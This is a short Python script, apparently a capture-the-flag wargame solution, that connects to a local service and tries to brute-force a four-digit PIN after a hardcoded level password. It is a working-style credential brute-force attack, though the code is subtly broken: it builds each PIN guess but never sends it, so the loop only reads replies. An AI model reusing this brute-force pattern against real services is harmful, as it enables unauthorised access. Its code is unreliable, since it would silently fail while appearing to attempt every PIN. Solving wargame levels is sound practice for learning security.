#!/usr/bin/python

import socket

host = "127.0.0.1"
port = 30002

password = "VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar".encode('utf-8')

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, port))

print(s.recv(1024).decode('utf-8'))

for i in range(10000):
    print(i)
    pin = password + b" " + str(i).zfill(4).encode('utf-8') + '\n'.encode('utf-8')
    answer = s.recv(1024).decode('utf-8')
    if not "Wrong!" in answer:
        print(answer)
        break
s.close()


#LVL 24 --> 25

